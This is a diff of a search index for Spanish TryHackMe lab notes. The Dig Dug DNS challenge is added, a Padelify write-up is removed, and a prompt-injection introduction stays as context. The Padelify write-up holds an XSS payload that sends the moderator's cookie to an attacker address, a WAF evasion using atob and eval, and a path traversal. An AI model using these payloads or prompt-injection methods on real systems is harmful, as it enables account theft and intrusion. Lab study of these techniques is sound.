@@ -1,42 +1,42 @@
 [
   {
+    "title": "1. Easy",
+    "path": "/apuntes/thm/maquinas/1-easy/1-easy/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy",
+    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6. [[0. TakeOver]]\n7. [[0. Overpass]]\n8. [[0. Publisher]]\n9. [[0. MD2PDF]]\n10. [[0. Basic Pentesting]]\n11. [[0. RootMe]]\n12. [[0. OhSINT]]\n13. [[0. Simple CTF]]\n14. [[0. Bounty Hacker]]\n15. [[0. Agent Sudo]]\n16. [[0. LazyAdmin]]\n17. [[0. Cyborg]]\n18. [[0. Skynet]]\n19. [[0. Startup]]\n20. [[0. Tomghost]]\n21. [[0. GamingServer]]\n22. [[0. Ignite]]\n23. [[0. Brute It]]\n24. [[0. Wgel CTF]]\n25. [[0. Anthem]]\n26. [[0. CTF collection Vol. 1]]\n27. [[0. Chill Hack]]\n28. [[0. Year of the Rabbit]]\n29. [[0. Lian_Yu]]\n30. [[0. Fowsniff CTF]]\n31. [[0. Easy Peasy]]\n32. [[0. Chocolate Factory]]\n33. [[0. Source]]\n34. [[0. Neighbour]]\n35. [[0. Agent T]]\n36. [[0. Poster]]\n37. [[0. VulnNet - Internal]]\n38. [[0. ColddBox - Easy]]\n39. [[0. Corridor]]\n40. [[0. Archangel]]\n41. [[0. Dig Dug]]\n42.",
+    "modified": "2026-04-14T16:16:27"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/1-easy/41-dig-dug/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/41. Dig Dug/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 41. Dig Dug",
+    "content": "Empezamos escaneando los puertos abiertos de la máquina.\n\n![[Pasted image 20260414180637.png]]\n\nParece que sólo está abierto el 22, pero sabemos que es un servidor DNS así que vamos a realizar más escaneos.\n\n![[Pasted image 20260414180655.png]]\n\nParece que está filtrado. Bueno vamos a seguir con `dig` a ver qué encontramos.\n\n![[Pasted image 20260414180054.png]]\n\nNada. Si probamos a listar el otro servidor que nos daban:\n\n![[Pasted image 20260414180141.png]]\n\nNada tampoco. Pero podemos usar `dig` para listar un servidor a través de otro servidor que sea el DNS.\n\n![[Pasted image 20260414180243.png]]\n\nAsí que vamos a probar.\n\n![[Pasted image 20260414180747.png]]\n\nEfectivamente encontramos la flag.",
+    "modified": "2026-04-14T16:16:27"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/1-easy/41-dig-dug/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/41. Dig Dug/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 41. Dig Dug",
+    "content": "![[Pasted image 20260414175028.png]]\n\nParece ser que esta máquina es un servidor DNS - hora de sacar las palas.\n\n¡Parece ser que esta máquina es también un servidor DNS! Si tan sólo pudiéramos cavar (`dig`), estoy seguro de que encontraríamos algo interesante en los registros. Pero parece extraño, esto sólo responde a un tipo especial de petición para el dominio `givemetheflag.com`.",
+    "modified": "2026-04-14T16:16:27"
+  },
+  {
+    "title": "0. Dig Dug",
+    "path": "/apuntes/thm/maquinas/1-easy/41-dig-dug/0-dig-dug/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/41. Dig Dug/0. Dig Dug.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 41. Dig Dug",
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/41. Dig Dug/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/41. Dig Dug/2. Getting the Flags]]",
+    "modified": "2026-04-14T16:16:27"
+  },
+  {
     "title": "1. Introduction",
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/5-attacking-llms/1-input-manipulation-and-prompt-injection/1-introduction/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/5. Attacking LLMs/1. Input Manipulation and Prompt Injection/1. Introduction.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 5. Attacking LLMs > 1. Input Manipulation and Prompt Injection",
     "content": "Los LLMs (Large Language Models) son diseñados para generar respuestas basadas en instrucciones y queries del usuario. En muchas aplicaciones, estos modelos operan con múltiples capas de instrucción:\n\n- **Prompts de Sistema:** Instrucciones escondidas que definen el rol y limitaciones del modelo (por ejemplo: \"Eres un asistente que ayuda, pero nunca revela sus herramientas internas o credenciales\").\n- **Prompts de Usuario:** Los inputs escritos por el usuario (por ejemplo: \"¿Cómo reseteo mi contraseña?\").\n\nLos atacantes se han dado cuenta de que construyendo sus prompts cuidadosamente, pueden confundir al modelo o incluso explotar su seguridad. A esto se le conoce como \"Input Manipulation\". La forma más común de realizarla es prompt injection, donde los atacantes cambian el flujo de instrucciones y fuerzan al modelo a ignorar o bypassear restricciones.\n\nEn algunos casos, la manipulación del input puede llevar a filtraciones de prompts de sistema, exponiendo configuración o instrucciones en los que el modelo confía.\n\nEl peligro recae en la confianza puesta en estos modelos:\n\n- Compañías que integran sus flujos (chatbots HR, asistentes IT, dashboards financieros...).\n- Los usuarios asumen que sus respuestas son autoritativas y seguras.\n- Los desarrolladores suelen subestimar cómo de fácil es saltarse estas restricciones.\n\nSi los atacantes pueden manipular el modelo, pueden:\n\n- Exfiltrar información sensible.\n- Engañar al sistema para que haga peticiones no autorizadas.\n- Filtrar las políticas internas o instrucciones escondidas.\n- Encadenar ataques con otras vulnerabilidades.\n\nEs importante recalcar que prompt injection no es un bug de software tradicional que puedas parchear en el modelo. Es una capacidad intrínseca que sigue cómo se diseñan los LLMs. Dicho de otra manera, no puedes eliminar completamente el prompt injection, sino que tienes que construir mitigaciones alrededor del modelo sanitizando y validando el contenido entrante.",
-    "modified": "2026-04-14T01:23:21"
-  },
-  {
-    "title": "2. Medium",
-    "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium",
-    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14. [[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]\n15. [[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]\n16.",
-    "modified": "2026-04-14T01:23:21"
-  },
-  {
-    "title": "0. Padelify",
-    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/0-padelify/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
-    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/2. Getting the Flags]]",
-    "modified": "2026-04-14T01:23:21"
-  },
-  {
-    "title": "2. Getting the Flags",
-    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/2-getting-the-flags/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/2. Getting the Flags.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
-    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos con un escaneo de puertos.\n\n![[Pasted image 20260413132109.png]]\n\nAhora vamos a escanear dichos puertos más en profundidad.\n\n![[Pasted image 20260413132132.png]]\n\nEsto podría permitirnos realizar un XSS.\n\nVamos a listar directorios web.\n\n```txt\npadelify.thm\n    ├── config [200 451B]\n    ├── js [200 461B]\n    ├── logs [200 455B]\n    │   └── error.log [200 1KB]\n    ├── footer.php [200 33B]\n    ├── header.php [200 728B]\n    ├── login.php [200 467B]\n    └── status.php [200 1KB]\n```\n\nVamos a ver cómo se ve la web.\n\n![[Pasted image 20260413132449.png]]\n\nAquí podemos ver algo de especial interés: El moderador debe aprobar nuestra cuenta.\n\nVamos a ver qué hay en los archivos que hemos encontrado.\n\n![[Pasted image 20260413132747.png]]\n\nVamos a seguir mirando.\n\n![[Pasted image 20260413132915.png]]\n\nY seguimos.\n\n![[Pasted image 20260413132958.png]]\n\n----------------------------\n<h2>Profundización</h2>\nSi intentamos entrar, por ejemplo a `app.conf`, nos sale lo siguiente:\n\n![[Pasted image 20260413132833.png]]\n\nVamos a ver `error.log`\n\n![[Pasted image 20260413133049.png]]\n\nParecen los logs de error del WAF en principio.\n\n-------------------------------\n<h2>Explotación</h2>\nVamos primero a capturar la petición de registro y a probar diferentes payloads en BurpSuite.\n\n![[Pasted image 20260413133641.png]]\n\nComo habíamos visto que la `httponly: not set`, podemos intuir un ataque XSS en este formulario para robar la cookie de sesión de `moderator`. Sin embargo, hay un WAF protegiendo el entorno, por lo que tendremos que dar con el bypass correspondiente.\n\n![[Pasted image 20260413134127.png]]\n\nParece que aunque subamos un payload como `<script>alert('XSS')</script>`, no tiene mayor repercusión, así que vamos a probar todos los campos para obtener la cookie de sesión del usuario `moderator`.\n\n![[Pasted image 20260413134635.png]]\n\nParece que un payload con impacto real sí que ha sido detectado. Vamos a probar diferentes técnicas de ofuscación. \n\nDespués de un rato probando, parece que `fetch` y `cookie` son dos palabras que causan problemas con el WAF. Investigo técnicas de ofuscación con comentarios y entidades HTML pero ninguna funciona, por lo que hay que probar otros comandos.\n\n![[Pasted image 20260413142237.png]]\n\nParece que `atob` y `eval` no están capados, por lo que mandamos `fetch('http://IP:PUERTO' + document.cookie)` encodeado en base64.\n\n![[Pasted image 20260413155819.png]]\n\n>[!CAUTION] Por algún motivo en mi máquina no funcionó y estuve mucho tiempo atascado, hasta que probé con la attackbox.\n\nIntroducimos la cookie en el navegador y refrescamos la página.\n\n![[Pasted image 20260413160012.png]]\n\n----------------------------------\n<h2>Escalada de Privilegios</h2>\nSi le damos al apartado `Live`, podemos ver que nos lleva a una página y que carga documentos:\n\n![[Pasted image 20260413160454.png]]\n\nEs aquí donde nos acordamos que había otros como `header.php`, y el más importante: `/config/app.conf`. Vamos a ver si podemos cargar uno inofensivo:\n\n![[Pasted image 20260413160631.png]]\n\nEfectivamente sí podemos, vamos a intentar un path traversal aquí:\n\n![[Pasted image 20260413160709.png]]\n\nPero nos bloquea, así que vamos a probar alguna técnica de ofuscación.\n\n![[Pasted image 20260413161135.png]]\n\nBingo! Eso parece una contraseña, vamos a probarla.\n\n![[Pasted image 20260413161312.png]]\n\nY ahí lo tenemos.",
-    "modified": "2026-04-14T01:23:21"
-  },
-  {
-    "title": "1. Introduction",
-    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/1-introduction/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/1. Introduction.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
-    "content": "![[Pasted image 20260413114030.png]]\n\nUsa técnicas de red teaming para bypassear el WAF y obtener acceso administrador a la aplicación web.\n\nHas ingresado en una competición de padel, pero tu rival sigue ascendiendo en la clasificación. El panel de administrador gestiona las aprobaciones y registros. ¿Puedes crackear el admin y reescribir el encuentro antes de que suene el silbato?",
     "modified": "2026-04-14T01:23:21"
   }
 ]
